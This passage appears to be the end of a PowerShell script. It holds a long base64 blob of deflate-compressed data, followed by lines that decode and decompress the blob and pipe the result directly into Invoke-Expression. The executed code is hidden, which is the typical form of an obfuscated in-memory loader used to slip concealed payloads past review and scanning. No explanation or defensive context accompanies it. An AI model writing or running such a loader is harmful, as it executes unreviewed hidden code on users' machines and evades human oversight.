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


'@

$Decoded = [System.Convert]::FromBase64String($EncodedCompressedFile)
$MemStream = New-Object System.IO.MemoryStream
$MemStream.Write($Decoded, 0, $Decoded.Length)
$MemStream.Seek(0,0) | Out-Null
$CompressedStream = New-Object System.IO.Compression.DeflateStream($MemStream, [System.IO.Compression.CompressionMode]::Decompress)
$StreamReader = New-Object System.IO.StreamReader($CompressedStream)
$Output = $StreamReader.readtoend()
$Output | IEX
```
